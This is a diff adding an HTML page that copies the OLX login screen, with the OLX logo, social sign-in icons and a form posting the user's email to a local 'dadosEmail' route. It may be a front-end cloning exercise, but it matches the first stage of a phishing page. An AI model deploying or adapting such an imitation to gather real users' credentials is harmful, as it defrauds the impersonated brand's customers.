@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/styles/stylePag1.css">
+    <title>account</title>
+</head>
+<body>
+    <header>
+        <div>
+            <img src="https://logopng.com.br/logos/olx-104.svg" alt="olx">
+        </div>
+    </header>
+    <div  class="divLinha">
+        <!--conteiner  linha -->
+    </div>
+    <main>
+        <form class="conteiner" action="/home/dadosEmail" method="post">
+            <div>
+                <h3>Acesse a sua conta</h3>
+            </div>
+            <div class="divInput">
+                <div>
+                    <label>E-mail</label><br>
+                    <input name="email" class="email" type="email">
+                    <div class="divspan">
+                        <span class="spanEmail">
+                            campo obrigatorio. informe um e-mail valido
+                        </span>
+                        <ion-icon class="iconErro" name="close-circle-outline"></ion-icon>
+                    </div>
+                </div>
+            </div>
+            <div>
+                <button class="btn" type="submit">Continuar</button>
+            </div>
+            <div class="connectse">
+                <div class="divHr">
+                    <hr>
+                </div>
+                 <p class="param">Ou conecte com </p>
+                 <div class="divHr">
+                    <hr>
+                </div>
+            </div>
+            <div class="logosSocial">
+                <div class="logotam">
+                    <img id="imgGoogle"  src="/logos/google-37.svg" alt="logo google">
+                </div>
+                <div class="logotam">
+                    <img  class="logosSocailLink" src="/logos/facebook-13.svg" alt="logo fecebook">
+                </div>
+            </div>
+            <div class="notAccount">
+                <p>Nao tem  uma conta ? <a href="#">Cadastre-se</a></p>
+            </div>
+            <hr class="hrFooter">
+            <div class="divfooter">
+                <p>Ao continuar , voce concorda com os <a href="#">Termos de Uso</a> e a </p>
+                <p><a href="#">Politica de privacidade</a> da OLX e seus parceiros, e em receber<br>cominicacoes da OLX</p>
+            </div>
+            <br>
+        </form>
+    </main>
+    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+    <script src="/javascript/pag1.js"></script>
+</body>
+</html>
